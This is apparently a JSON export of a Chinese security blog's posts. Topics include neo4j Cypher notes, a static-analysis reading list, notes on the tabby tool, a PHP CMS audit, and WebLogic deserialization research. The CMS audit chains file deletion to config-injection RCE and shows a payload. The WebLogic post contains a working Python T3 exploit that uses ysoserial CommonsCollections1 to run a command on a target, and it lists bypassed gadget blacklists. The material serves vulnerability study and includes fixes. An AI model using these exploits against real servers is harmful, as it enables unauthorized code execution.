IDBFactory::getDB();\t\t$dbObj-&gt;query($sql);\t&#125;\n之后我们回到商家管理平台，商品列表这里点击删除操作，id对应为5\n\n\n根据路由定位至seller.php的goods_del方法，这里也是获得到参数后调用del()\n\n跟进后可以看到，其首先会从goods_photo_relation表中根据id=5查出关联信息，进一步由于我们这里关联了photo_id，因此从goods_photo查出了img字段的内容，也就是任意文件的地址，我们这里为了进一步构成RCE，因此选择install/install.lock文件，后面可以看到会对img的内容调用unlink方法\n\n\n\n在unlink方法中我们便看到了删除文件操作，期间也未对文件名作过滤，这里便构成了任意删除文件漏洞\n\n删除lock文件之后再去访问install/index.php便可造成系统重装，我们看看这里的利用\n\n根据路由定位至install/include/function.php方法，其中install_sql()方法中看到，这里有个create_config()，写入配置文件的操作，而且写入对象还是php文件，是否可以利用呢？跟入该方法\n\n可以看到也是没过滤就直接写入updateData变量内容，而该变量的值又由用户传入。只不过这里写入的时候是按照数组键值对的方式写入，应该是该框架针对配置项的一种安排方式。我们可以通过提前闭合语句的方式来造成RCE，毕竟是PHP文件，这里只要稍稍测试来闭合一下引号和括号即可\n\n\n这里可以看到config/config.php文件中的格式，我们根据前面数组的括号数量提前闭合即可\n\npayload\ndb_address=localhost%3A3306&amp;db_user=root&amp;db_pwd=root&amp;db_name=testcms&#x27;,&#x27;evil&#x27;=&gt;phpinfo()))))?&gt;\n\n需要再配合文件删除漏洞删掉config下的.htaccess文件\n再去访问config/config.php\n\n参考链接https://y4tacker.blog.csdn.net/article/details/118029055\n","tags":["代码审计"]},{"title":"neo4j部分文档学习","url":"/2022/11/05/neo4j/","content":"写在前面记录一下跟着文档学习neo4j，里面会牵涉到一些在扫链子当中需要用的重要概念\nMATCH用于去匹配指定的模式\n以下图中的样本图为例\n\n\n基本的结点搜寻\n\n获取所有结点\nMATCH (n)RETURN n\n\n获取所有带标签的结点\nMATCH (movie:Movie)RETURN movie.title\n\n相关结点\n标志--代表中一种关联，但是忽视关联的方向和类型\nMATCH (director &#123;name: &#x27;Oliver Stone&#x27;&#125;) -- (movie)RETURN movie.title\n\n匹配标签\n为了利用标签模式来限制结点，在模式结点上加入标签语法\nMATCH (:Person &#123;name: &#x27;Oliver Stone&#x27;&#125;) -- (movie:Movie)RETURN movie.title\n\n\n\n基本关系概念\n\n外向关系\n当关系表现出倾向性，通过--&gt;或&lt;--来表示\nMATCH (:Person &#123;name: &#x27;Oliver Stone&#x27;&#125;) --&gt; (movie)RETURN movie.title\n\n直接关系和变量\n可以通过一个变量来过滤关系的属性或者返回关系\nMATCH (:Person &#123;name: &#x27;Oliver Stone&#x27;&#125;) -[r]-&gt; (movie)RETURN type(r)\n该语句可以返回所有从Oliver发出的有向关系的类型\n\n匹配关系类型\n当你知道想要匹配的关系类型时，通过:关系类型来指定\nMATCH (wallstreet:Movie &#123;title: &#x27;Wall Street&#x27;&#125;)&lt;-[:ACTED_IN]-(actor)RETURN actor.name\n\n匹配多种关系类型\n可以将多种关系类型用|连接起来，表示匹配多种关系类型之一\nMATCH (wallstreet:Movie &#123;title: &#x27;Wall Street&#x27;&#125;)&lt;-[:ACTED_IN|DIRECTED]-(actor)RETURN actor.name\n\n匹配关系类型并使用变量\n如果想要用变量来表示关系，且想指定想要的关系类型，都加上去即可\nMATCH (wallstreet &#123;title: &#x27;Wall Street&#x27;&#125;)&lt;-[r:ACTED_IN]-(actor)RETURN r.role\n\n\n\n关系深度\n在单一模式下，关系只会被匹配一次\n\n关系类型中包含非常见字符\n有时数据库关系类型中包含非常见类型，比如空格。这时可以通过反引号`来引用\n\n例如上图中的红线，可以如下查询\nMATCH (n &#123;name: &#x27;Rob Reiner&#x27;&#125;)-[r:`TYPE INCLUDING A SPACE`]-&gt;  ()RETURN type(r)\n\n多重关系\n多个关系可以通过使用多个()--()形式的表达式来表示，或者直接连起来\nMATCH (chalie &#123;name: &#x27;Charlie Sheen&#x27;&#125;)-[:ACTED_IN]-&gt;(movie)&lt;-[:DIRECTED]-(direcotr)RETURN movie.title, director.name\n\n变长关系\n需要多个relationship-&gt;node模式表示的结点可以通过-[:TYPE*minHops..maxHops]-&gt;来表示，其中minHops和maxHops是可选的，默认分别是1和无穷大。当没有给定界限时，点号可以忽略。当只有一个界限时点好也可以忽略，表示的是一个固定长度的模式\nMATCH (charlie &#123;name: &#x27;Charlie Sheen&#x27;&#125;) -[:ACTED_IN*1..3]-(movie:Movie)RETURN movie.title\n\n变长多种关系\n变长关系和多种关系可组合。这样的话变长范围适用于所有结合的关系类型\nMATCH (charlie &#123;name: &#x27;Charlie Sheen&#x27;&#125;)-[:ACTED_IN||DIRECTED*2]-(person:Person)RETURN person.name\n\n可变长度关系的关系变量\n当在两节点之间的连接是可变长度时，返回的构成连接的关系列表可以如下语法表示\nMATCH p = (actor &#123;name: &#x27;Charlie Sheen&#x27;&#125;)-[:ACTED_IN*2]-(co_actor)RETURN relationships(p)\n\n匹配可变长路径上的属性\n变长关系上的属性意味着在路径上的所有关系都必须拥有指定的属性值。例如下图所示\n\nMATCH p = (charlie:Person)-[* &#123;blocked:false&#125;]-(martin:Person)WHERE charlie.name = &#x27;Charlie Sheen&#x27; AND martin.name = &#x27;Martin Sheen&#x27;RETURN p\n这将返回所有在 ‘Charlie Sheen’ 和 ‘Martin Sheen’之前的路径且满足属性blocked为false\n\n零长路径\n使用下限为0的变长路径意味着两个变量可以指向同一结点。如果两节点之间的路径长度为0的话，它们就被定义为同一结点。注意到当匹配零长路径时结果即使未使用关系类型也能匹配到一个结果（即自身？）\nMATCH (wallstreet:Movie &#123;title: &#x27;Wall Street&#x27;&#125;)-[*0..1]-(x)RETURN x\n\n命名路径\n当想要在模式图中返回或过滤一条路径，可以引入命名路径\nMATCH p = (michael &#123;name: &#x27;Michael Douglas&#x27;&#125;)--&gt;()RETURN p\n\n匹配有界关系\n当你的模式包含有界关系，而关系中并没有明确方向，Cypher会尝试双向匹配关系\nMATCH (a)-[r]-(b)WHERE id(r) = 0RETURN a,b\n该语句会返回两个连接节点，一个是开始结点，另一个是终止结点\n\n\n\n最短路径\n\n单一最短路径\n使用函数shortestPath\nMATCH \t(martin:Person &#123;name: &#x27;Martin Sheen&#x27;&#125;)\t(oliver:Person &#123;name: &#x27;Oliver Stone&#x27;&#125;)\tp = shortestPath((martin)-[*..15]-(oliver))RETURN p\n这意味着：只要路径长度最大不超过15，就会在其中寻找满足的最短路径。在括号中定义了开始结点，连接关系和终止结点。在寻找最短路径时典型的描述关系的条件如关系类型，最大跳数和方向都会用上。如果在shortestPath匹配之后跟着where语句，相应的限定都会包含在寻找过程中。如果谓词是none()或all()，同理。\n\n单一最短路径，带上谓词\n在最短路径模式中用上谓词WHERE也会在决定最短路径前进行评估\nMATCH \t(charlie:Person &#123;name: &#x27;Charlie Sheen&#x27;&#125;),\t(martin:Person &#123;name: &#x27;Martin Sheen&#x27;&#125;),\tp = shortestPath((charlie)-[*]-(martin))WHERE none(r IN relationships(p) WHERE type(r) = &#x27;FATHER&#x27;)RETURN p\n不考虑父子关系\n\n所有最短路径\n寻找两节点间所有最短路径\nMATCH  (martin:Person &#123;name: &#x27;Martin Sheen&#x27;&#125; ),  (michael:Person &#123;name: &#x27;Michael Douglas&#x27;&#125;),  p = allShortestPaths((martin)-[*]-(michael)) RETURN p\n\n\n\n通过id获得节点或关系\n\nid寻找节点\n在谓词中使用id()函数可以通过id来寻找节点\nMATCH (n)WHERE id(n) = 0RETURN n\n\nid获取关系\n在谓词中使用id()函数可以通过id来寻找关系\nMATCH ()-[r]-&gt;()WHERE id(r) = 0RETURN r\n\nid寻找多个节点\n通过利用IN可以指定选择多个节点\nMATCH (n)WHERE id(n) IN [0,3,5]RETURN n\n\n\n\n\nRETURN定义查询结果集都有什么\n\n\n返回节点\n直接列举在RETURN陈述句当中即可\nMATCH (n &#123;name: &#x27;B&#x27;&#125;)RETURN n\n\n返回关系\n同理\nMATCH (n &#123;name: &#x27;A&#x27;&#125;)-[r:KNOWS]-&gt;(c)RETURN r\n\n返回属性\n利用点分隔符\nMATCH (n &#123;name: &#x27;A&#x27;&#125;)RETURN n.name\n\n返回所有元素\n同样支持统配符*来返回    所有结点、关系和路径\nMATCH p = (a &#123;name: &#x27;A&#x27;&#125;)-[r]-&gt;(b)RETURN *\n这将返回p a r b\n\n非常见字符变量\n为了引进并不是由英文字母表中元素构成的占位符（变量），可以利用`来闭合\nMATCH (`This isn\\&#x27;t a common variable`)WHERE `This isn\\&#x27;t a common variable`.name = &#x27;A&#x27;RETURN `This isn\\&#x27;t a common variable`.happy\n\n字段别名\n如果字段名需要和表达式所使用的区分，可以使用AS &lt;new name&gt;\nMATCH (a &#123;name: &#x27;A&#x27;&#125;)RETURN a.age AS SomethingTotallyDifferent\n\n可选属性\n如果所指定输出的属性不存在，会返回null\n\n其他表达式\n任何表达式都可以作为返回项\nMATCH (a &#123;name: &#x27;A&#x27;&#125;)RETURN a.age &gt; 30, &quot;I&#x27;m a literal&quot;, [p=(a)--&gt;() | p] AS `(a)--&gt;()`\n\n唯一结果\nDISTINCT 限制了相应字段的输出结果不能重复\nMATCH (a &#123;name: &#x27;A&#x27;&#125;)--&gt;(b)RETURN DISTINCT b\n\n\nWHERE\n\n基本使用\n\n布尔操作\n可以利用逻辑连接符AND OR XOR NOT\nMATCH(n:Person)WHERE n.name = &#x27;Peter&#x27; XOR (n.age &lt; 30 AND n.name = &#x27;Timothy&#x27;) OR NOT (n.name = &#x27;Timothy&#x27; OR n.name = &#x27;Peter&#x27;)RETURN \tn.name AS name,\tn.age AS ageORDER BY name\n\n过滤结点标签\n在WHERE后写上标签谓词n:foo， 可以过滤结点\nMATCH (n)WHERE n:SwedishRETURN n.name, n.age\n\n过滤结点属性\n同理\nMATCH (n:Person)WHERE n.age &lt; 30RETURN n.name, n.age\n\n过滤关系属性\n同理\nMATCH (n:Person)-[k:KNOWS]-&gt;(f)WHERE k.since &lt; 2000 RETURN f.name, f.age, f.email\n\n过滤动态计算属性\n当需要动态计算来过滤属性，使用方括号\nWITH &#x27;AGE&#x27; AS propnameMATCH (n:Person)WHERE n[toLower(propname)] &lt; 30RETURN n.name, n.age\n\n属性存在性检查\n使用IS NOT NULL谓词来只包含属性存在的结点或关系\nMATCH (n:Person)WHERE n.belt IS NOT NULLRETURN n.name, n.belt\n\n与WITH配合使用\n强调当WITH写在WHERE之前时，WHERE的作用域并不会被左右\nMATCH (n:Person)WITH n.name as nameWHERE n.age = 25RETURN name\nWHERE仍然视为MATCH的过滤，但WITH剩余查询部分的作用范围，也就是说，name是RETURN 作用域中的唯一变量\n\n\n\n字符串匹配\n字符串前缀和后缀的匹配可以使用STARTS WITH和ENDS WITH . 而如果想要子串搜索，不考虑位置，用CONTAINS. 匹配时大小写敏感，如果对非字符串使用的话将会返回NULL\n\n前缀字符串搜索利用START WITH\n位置：字符串开头\nMATCH (n:Person)WHERE n.name STARTS WITH &#x27;Pet&#x27;RETURN n.name, n.age\n\n后缀字符串搜索利用ENDS WITH\n位置：字符串结尾\nMATCH (n:Person)WHERE n.name ENDS WITH &#x27;ter&#x27;RETURN n.name, n.age\n\n子串搜索利用 CONTAINS\n不管位置\nMATCH (n:Person)WHERE n.name CONTAINS &#x27;ete&#x27;RETURN n.name, n.age\n\n反向匹配字符串\nNOT关键字排除掉所有匹配的字符串\nMATCH (n:Person)WHERE NOT n.name ENDS WITH &#x27;y&#x27;RETURN n.name, n.age\n\n\n\n正规表达式\nCypher支持正轨表达式过滤。同时支持flags标志来改变字符串的匹配方式，(?i)大小写不敏感，(?m)多行匹配，(?s)支持点号。Flags标志位放在正规表达式的开头\n\n使用正规表达式进行匹配\n语法：=~ &#39;regexp&#39;\nMATCH (n:Person)WHERE n.name =~ &#x27;Tim.*&#x27;RETURN n.name, n.age\n\n正规表达式转义使用\n转义特殊字符. *\nMATCH (n:Person)WHERE n.email =~ &#x27;.*\\\\.com&#x27;RETURN n.name, n.age, n.email\n\n大小写不敏感\n开头加?i\nMATCH (n:Person)WHERE n.name =~ &#x27;(?i)AND.*&#x27;RETURN n.name, n.age\n\n\n\n在WHERE中使用路径模式\n\n模式过滤\n模式不仅是表达式，也是谓词。模式的唯一限制是必须能够用它来表示单一路径。不能在像用MATCH中一样用逗号分隔多种路径，可以用AND来结合。\n注意这里不能引入新的变量。WHERE字段作用是排除匹配路径。\nMATCH \t(timothy:Person &#123;name:&#x27;Timothy&#x27;&#125;),\t(other:Person)WHERE other.name IN [&#x27;Andy&#x27;, &#x27;Peter&#x27;] AND (other)--&gt;(timothy)RETURN other.name, other.age\n\n模式过滤使用NOT\n作用就是排除路径\nMATCH  (person:Person),  (peter:Person &#123;name: &#x27;Peter&#x27;&#125;) WHERE NOT (person)--&gt;(peter) RETURN person.name, person.age\n\n模式过滤带上属性\nMATCH (n:Person)WHERE (n)-[:KNOWS]-(&#123;name: &#x27;Timothy&#x27;&#125;)RETURN n.name, n.age\n\n关系类型过滤\n可以使用特殊属性type来比较，支持正轨表达式\nMATCH (n:Person)-[r]-&gt;()WHERE n.name=&#x27;Andy&#x27; AND type(r) =~ &#x27;K.*&#x27;RETURN type(r), r.since\n\n\n\n存在性子查询\n遇到再看\n\n列表\n\nIN 操作符\n检查是否有元素存在于列表中\nMATCH (a:Person)WHERE a.name IN [&#x27;Peter&#x27;, &#x27;Timothy&#x27;]RETURN a.name, a.age\n\n错误的属性和值\n当匹配一个不存在的值时，默认为false\n如果想排除掉不存在的值，加上条件\nMATCH (n:Person)WHERE n.belt = &#x27;white&#x27; OR n.belt IS NULLRETURN n.name, n.age, n.beltORDER BY n.name\n\n\n\n范围\n\n简单的范围\n支持&lt; &lt;= &gt;= &gt;\nMATCH (a:Person)WHERE a.name &gt;= &#x27;Peter&#x27;RETURN a.name, a.age\n\n复合范围\n几个不等式的组合\nMATCH (a:Person)WHERE a.name &gt; &#x27;Andy&#x27; AND a.name &lt; &#x27;Timothy&#x27;RETURN a.name, a.age\n\n结点模式谓词\nWHERE 也可以出现在结点模式里面（MATCH语句内或模式构成当中）\nWITH 30 AS minAgeMATCH (a:Person WHERE a.name = &#x27;Andy&#x27;)-[:KNOWS]-&gt;(b:Person WHERE b.age &gt; minAge)RETURN b.name\n注意 WHERE可以引用它所属于的结点的变量，但无法引用其他MATCH模式的变量\nMATCH (a:Persom &#123;name: &#x27;Andy&#x27;&#125;)RETURN [(a)--&gt;(b WHERE b:Person) | b.name] AS friends\n\n\n\n\nCALL procedureCALL用于调用置于数据库中的程序\n每一个程序调用都需要指定所需的参数。可以通过在程序名后用括号包裹逗号分隔的列表，或者通过可获得的查询参数作为调用参数。后者可以使用当且仅当所谓的独立程序调用时，整个查询构成了单一的CALL语句。\n大多数程序会返回由固定结果数据集组成的记录流，与Cypher查询返回的流数据类似。YIELD子句从可获得的结果集中选择想要 返回调用程序给用户的指定变量，或者用于处理剩下的查询过程。因此，为了使用YIELD来明确字段，输出的参数名需要预知。每一个产生的结果集都可以选择性地起别名（resultFieldName AS newName. 所有由程序调用产生的新变量都会被添加到当前已在变量的作用域中。但是如果一个程序调用尝试重绑定已存在变量将会报错。在独立的程序调用中，YIELD *可用于选择全部变量。这个时候输出参数的名字就并不必要。\nNeo4j支持VOID的概念。VOID程序是一个不会声明和返回结果记录的程序。因此，不允许也没必要使用YIELD. \n\n查看一个程序的特征\n当去调用一个程序时，输入参数需要知道；使用YIELD子句时，输出参数也需要知道。内置程序dbms.procedures可以返回所有程序的名字，特征和描述。\nCALL dbms.procedures() YIELD name, signatureWHERE name=&#x27;dbms.listConfig&#x27;RETURN signature\n\n\n使用引用命名空间和名字调用程序\n调用内置程序db.labels可以列出数据库中的所有标签\nCALL `db`.`labels`\n\n\n字面量参数调用程序\n直接在陈述句中写出即可\nCALL dbms.security.createUser(&#x27;example_username&#x27;, &#x27;example_password&#x27;, false)\n\n使用参数来调用程序\n程序参数的值与对应传递的同名参数相一致 （没有给出的就是Null）\n传递参数的形式（如JSON) 取决于使用的驱动\n\n\n\n","tags":["database"]},{"title":"paper梳理","url":"/2077/07/07/paper/","content":"写在前面静态分析的知识碎而杂，但是自己感兴趣的偏污点分析那一部分，应用在漏洞检测和挖掘。这里梳理一下几个需要看的paper\nvideo\nhttps://liveclass.org.cn/cloudCourse/#/courseDetail/8mI06L2eRqk8GcsW\nLecture Notes on Static AnalysisDenmark大学Michael Schwatzbach\nCMU Jo Aldrich的Program Analysis课程\n\nblog paper\nhttps://y4er.com/posts/simple-use-of-the-java-static-analysis-framework-tai-e/#%E5%89%8D%E8%A8%80\nhttps://tttang.com/archive/1510/\nhttps://tttang.com/archive/1541/\nhttps://mp.weixin.qq.com/s?__biz=MzAxNDk0MDU2MA==&amp;mid=2247484231&amp;idx=1&amp;sn=c6de1b4c559efb4a9a40e1ac5be7030a&amp;chksm=9b8ae3b8acfd6aaec81ef5bee4f80d9c53379d7e23b269e7905e92e7c2cda9b45818b0abf63b#rd\nhttps://tttang.com/archive/1696/\nhttps://blog.0kami.cn/blog/2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/\n\nPaper\nhttps://github.com/RacerZ-fighting/PL-Compiler-Resource\nPL相关的知识集合\n\n面向源代码的软件漏洞静态检测综述 √综述类 paper\n\ntabby 毕业设计论文 √\n\nP/Taint: Unified Points-to and Taint Analysis √讲述 污点分析和指针分析之间的关系\n\nTai-e: A Static Analysis Framework for Java by Harnessing the Best Designs of Classicstaie -e框架\n\nSelf-Inferencing Reflection Resolution for Java第一篇反射解决提出的paper\n\nUnderstanding and Analyzing Java Reflection 最近的一篇针对反射的paper\n\nTaming reflection: Aiding static analysis in the presence of reflection and custom class loaders\n一篇动态分析的技术\n\n沈维军, 汤恩义, 陈振宇, 等. 数值稳定性相关漏洞隐患的自动化检测方法\n动静态结合\n\nYAMAGUCHI F, GOLDE N, ARP D, et al. Modeling and discovering vulnerabilities with code property graphs[C] √\nYamaguchi 提出代码属性图的概念，其结合了抽象语法树、控制流图和程序依赖图 \n\n王蕾, 李丰, 李炼, 等. 污点分析技术的原理和实践应用\n\nM. Martin, B. Livshits, and M. S. Lam. Finding application errors and security flaws using pql: Program query language. In Proc. ofACM SIGPLAN International Conference on Object-Oriented Programming, Systems, Languages and Applications (OOPSLA), 2005 √\nPQL语言的漏洞分析思路\n\n\n"},{"title":"tabby 原理学习","url":"/2022/12/27/tabby%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/","content":"写在前面开始学习工具化利用了（虽然还有好多漏洞没复现hhh），但是项目要继续推进了，先从工具层面开始分析吧。里面总结一些自己需要学习的基础知识\n基本使用\n查询所有类方法\nmatch (source:Method) return *match (source:Method &#123;NAME:&quot;exec&quot;&#125;) return *\n\nAlias边含义，隐含继承、接口实现关系\n\n\n\n\n\n由于Alias的无指向性，从任何一个结点都可以得到完整的Alias函数别名图\n\nNeo4j路径检索插件 apoc.algo.allSimplePaths\napoc.algo.allSimplePaths(startNode :: NODE?, endNode :: NODE?, relationshipTypesAndDirections :: STRING?, maxNodes :: INTEGER?) :: (path :: PATH?)\n\n\nstartNode - 开始节点，也就是Source\nendNode - 结束节点，也就是Sink\nrelationshipTypesAndDirections - Neo4j的关系边，类型是字符串，可以设置为多个关系。查询时会按照这个关系进行路径图的查找\nmaxNodes - 搜索的最大节点数，也就是路径深度。注意千万不能设太大，尤其是节点很多的时候。\n\n同时还有一个输出参数：\n\npath - 没看到文档有特别说明233，看到文档中给的都是YIELD path, weight\n\n\n\n对路径上的结点作限制\nwhere any(n in nodes(path) where n.NAME=&quot;equals&quot; and n.CLASSNAME=&quot;java.net.URL&quot;)\n\n结合插件进行路径搜索 模板\n// CC3match (source:Method) where source.NAME=&quot;readObject&quot; match (m1:Method) where  m1.NAME=&quot;newInstance&quot; and m1.CLASSNAME=&quot;java.lang.reflect.Constructor&quot;call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 5) yield pathwhere any(n in nodes(path) where n.NAME=&quot;transform&quot;)return * limit 100\n\nsink规则\n\n\n探究底层可以搜索到哪里\n首先Runtime.exec的完整调用链如下\ncreate:-1, ProcessImpl (java.lang)&lt;init&gt;:386, ProcessImpl (java.lang)start:137, ProcessImpl (java.lang)start:1029, ProcessBuilder (java.lang)exec:620, Runtime (java.lang)exec:450, Runtime (java.lang)exec:347, Runtime (java.lang)main:3, RuntimeTest\n增加一点类的限制\nmatch (source:Method &#123;NAME:&quot;exec&quot;&#125;) where source.CLASSNAME = &quot;java.lang.Runtime&quot;match (sink:Method &#123;NAME:&quot;start&quot;&#125;) where sink.CLASSNAME = &quot;java.lang.ProcessBuilder&quot;call apoc.algo.allSimplePaths(sink, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path return * limit 20\n这里到没有搜到，而且明显搜索时间很短，类似和缓存的效果一样。目前的想法是它这里的污点分析算法由于依赖于先验知识库中的sink点规则，所以相当于这里的查询规则没有匹配到任何路径（因为两个结点都是sink点）\nProcessImpl.&lt;init&gt;((UNIXProcess.java:386))处调用了native方法\n\n规则库中设置的sink点的深度\n\n但实际上是soot是导入了native方法的，我认为这里应该是由于污点分析时source点和sink点未能匹配到导致的\n\n似乎已经被设置为sink点的类就无法继续往下查\nmatch (m1:Method &#123;NAME:&quot;exec&quot;, CLASSNAME:&quot;java.lang.Runtime&quot;&#125;)-[:CALL]-&gt;(m2:Method) return * \n\n\n\n限制\n\n依赖于sink点和source点的先验知识库\n不支持动态代理\n由于路径过深或查询条数过多都会在一定程度上影响分析也比较吃电脑性能\n\n\n\n优化\n\nTabbyVariable 代表方法中局部变量的类型\n\n\n其中TabbyValue类型的对象内部包裹着TabbyStatus类型的对象，保存了污点参数的信息。内部使用时通过下面的方法来获取\n\n架构\n\n流程\n\n核心\n\n函数别名图\n\n自动化方式\n\n参考链接[1] https://tttang.com/archive/1696/\n[2] https://cangqingzhe.github.io/2022/05/03/Tabby%E6%8C%96%E6%8E%98%E5%88%A9%E7%94%A8%E9%93%BE/\n","tags":["静态分析"]},{"title":"初识weblogic","url":"/2022/11/29/weblogic/","content":"XMLDecoder反序列化前置知识：\nXMLDecoder主要支持SAX和DOM解析标准XML，前者将数据解析为时间流，后者构建它的对象。\n\nDOM在解析时会先构建成一棵树，并进行遍历解析，易受到性能问题的影响。而SAX解析则是线性时间的，XMLDecoder在解析时采用SAX解析规范。\n\nSAX\n基于事件驱动的设计模式。拆分即有事件源和事件处理器以及对应的注册方法将两者连接起来\n\nSAX对象使用SAXParser.parer()作为事件源，ContentHandler、ErrorHandler、DTDHandler、EntityResolver作为事件处理器\n\nXMLDecoder反序列化流程解析\n\n\nT3协议\nWeblogic RMI与JAVA RMI不同之处\n\nWebLogic RMI支持集群部署和负载均衡\n\nWebLogic RMI的服务端会使用字节码生成（Hot Code Generation）功能生成代理对象\n因此不再需要 Skeleton 骨架对象以及 UnicastRemoteObjec t对象\n\nWebLogic RMI客户端使用动态代理\n也是使用字节码生成功能，因此不需要 Stub对象\n\n\n\nT3协议特点\n\n服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。\n通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。\n\n\n\n下面进行抓包分析，先在服务器端部署jar包，里面是一个简单的demo\npackage examples.rmi.hello;import javax.naming.InitialContext;import java.rmi.RemoteException;public class HelloImpl implements IHello&#123;    private String name;    public HelloImpl(String s) throws RemoteException &#123;        super();        name = s;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        return &quot;Hello World!&quot;;    &#125;    public static void main(String[] args) throws Exception&#123;        try &#123;            HelloImpl obj = new HelloImpl(&quot;HelloServer&quot;);            InitialContext ctx = new InitialContext();            ctx.bind(&quot;HelloServer&quot;, obj);            System.out.println(&quot;HelloImpl created and bound in the registry&quot; +                    &quot; to the name HelloServer&quot;);        &#125;catch (Exception e) &#123;            System.out.println(&quot;HelloImpl.main: an exception occurred: &quot;);            System.out.println(e.getMessage());            throw e;        &#125;    &#125;&#125;\n这里注意部署目录默认时域服务器下的lib目录，也就是/u01/app/oracle/Domains/ExampleSilentWTDomain/lib/\n\n客户端如下（需要配合wlthint3client.jar以支持t3协议）\npackage examples.rmi.hello;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Hashtable;public class HelloClient &#123;    // Defines the JNDI context factory.    public final static String JNDI_FACTORY = &quot;weblogic.jndi.WLInitialContextFactory&quot;;    public HelloClient() &#123;    &#125;    public static void main(String[] args) throws Exception &#123;        String host = &quot;172.16.80.136&quot;;        int port = 7001;        try &#123;            InitialContext ic = getInitialContext(&quot;t3://&quot; + host + &quot;:&quot; + port);            IHello obj = (IHello) ic.lookup(&quot;HelloServer&quot;);            System.out.println(&quot;Successfully connected to HelloServer on &quot; +                    host + &quot; at port &quot; +                    port + &quot;: &quot; + obj.sayHello());        &#125; catch (Exception ex) &#123;            System.err.println(&quot;An exception occurred: &quot; + ex.getMessage());            throw ex;        &#125;    &#125;    private static InitialContext getInitialContext(String url)            throws NamingException &#123;        Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        env.put(Context.PROVIDER_URL, url);        return new InitialContext(env);    &#125;&#125;\n\n这里利用wireshark进行抓包分析\n\n可以看到之前也会有一个tcp建立连接的阶段，客户端与服务器端双方会发送各自的版本信息，我们基于此可以进行weblogic的版本探测利用。开头可以构造形式如\nt3 10.3.6\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\n\n\n这里可以看出T3协议由协议头包裹，且数据包中包含多个序列化的对象。因此我们的利用原理就是构造恶意对象并封装到数据包中重新发送了，送上流程图\n\n配置调试环境利用工具 https://github.com/QAX-A-Team/WeblogicEnvironment\n注意iptables设置 idea设置远程调试\n\n\nCVE-2015-4582POC:\nfrom calendar import day_abbrfrom os import popenimport struct  # 负责大小端的转换import subprocessfrom sys import stdoutimport socketimport reimport binasciidef generatePayload(gadget, cmd):    YSO_PATH = &quot;D:\\渗透\\工具\\利用\\ysoserial-all.jar&quot;    popen = subprocess.Popen(        [&#x27;java&#x27;, &#x27;-jar&#x27;, YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)    return popen.stdout.read()def T3Exploit(ip, port, payload):    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.connect((ip, port))    handshake = &quot;t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n&quot;    sock.sendall(handshake.encode())    data = sock.recv(1024)    print(data)    compile = re.compile(&quot;HELO:(.*).0.false&quot;)    match = compile.findall(data.decode())    if match:        print(&quot;Weblogic: &quot;+&quot;&quot;.join(match))    else:        print(&quot;Not Weblogic&quot;)        # return    header = binascii.a2b_hex(b&quot;00000000&quot;)    t3header = binascii.a2b_hex(        b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)    desflag = binascii.a2b_hex(b&quot;fe010000&quot;)    payload = header + t3header + desflag + payload    payload = struct.pack(&quot;&gt;I&quot;, len(payload)) + payload[4:]    sock.send(payload)if __name__ == &quot;__main__&quot;:    ip = &quot;172.16.80.136&quot;    port = 7001    gadget = &quot;CommonsCollections1&quot;    cmd = &quot;touch /tmp/success&quot;    payload = generatePayload(gadget, cmd)    T3Exploit(ip, port, payload)\n这里存在一个问题就是刚开始发送版本探测包的时候并不能正常返回服务端版本信息，然而用wireshark抓包却可以抓到完整的版本信息。初步推测可能和操作系统版本有关\n\n利用CC1进行反序列化利用最终在/tmp目录下生成success文件\n\n\n漏洞分析\n序列化数据进入的函数入口在weblogic.rjvm.InboundMsgAbbrev#readObject()，可以看到里面调用了InboundMsgAbbrev.ServerChannelInputStream#readObject()\n\n进入该内部类，其继承于ObjectInputStream类，并重写了resolveClass()方法，但是可以看到，其中仍会调用父类的方法且未作过滤检验。该方法也是原生反序列化漏洞的触发点\n\n\n关于resolveClass方法\n从类序列化描述符获取类的Class对象。从类描述中获取到了全限定类名，然后利用反射根据全限定类名来获取到对应的 Class 对象并且进行返回。所以这里也是最好做防御的地方，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有\n\n修复方案\n打补丁的方式：在resolveClass方法中实现拦截\nweb代理的方式：只转发HTTP请求，不会转发T3协议的请求\n负载均衡方式：与WEB代理类似，只接受HTTP请求的转发\n\n\nCVE-2016-0638绕过了resolveClass中黑名单限制\norg.apache.commons.collections.functors* *com.sun.org.apache.xalan.internal.xsltc.trax* *javassist* *org.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.ConversionHandlerorg.codehaus.groovy.runtime.MethodClosure\n利用类weblogic.jms.common.StreamMessageImpl中的readExternal()，该方法对输入流进行了二次反序列化\n\n\n利用 